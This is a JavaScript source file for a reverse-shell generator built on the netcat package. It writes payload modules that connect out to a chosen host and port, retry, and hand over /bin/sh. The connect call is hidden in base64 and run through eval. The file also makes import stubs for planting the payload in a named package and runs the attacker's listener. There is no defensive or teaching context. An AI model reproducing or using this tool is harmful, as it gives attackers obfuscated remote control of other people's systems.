import netcat from 'netcat';

class ReverseShellGenerator {
	constructor({ host, port }) {
		this.host = host;
		this.port = port;
	}

	client() {
		const client_code = `client.addr('${this.host}').port(${this.port}).retry(5000).connect().exec('/bin/sh');`;
		const encoded_client_code = Buffer.from(client_code).toString('base64');
		const code = `import netcat from 'netcat';
const client = new netcat.client();
class ReverseShell {
    constructor() {
        eval(Buffer.from('${encoded_client_code}', 'base64').toString('ascii'));
    }
}
`;

		return `${code}
export default ReverseShell`;
	}

	opener(pkg) {
		// swap hyphens with underscore
		let new_pkg = pkg.replace(/-/g, '_');
		const code = `;const Client = new ${new_pkg}();`;
		return `import ${new_pkg} from '${pkg}';\nconst Client = new ${new_pkg}();\n`;
	}
	runLocalServer() {
		const server = new netcat.server();
		server.k().port(this.port).listen().serve(process.stdin).pipe(process.stdout);
	}
}

export default ReverseShellGenerator;
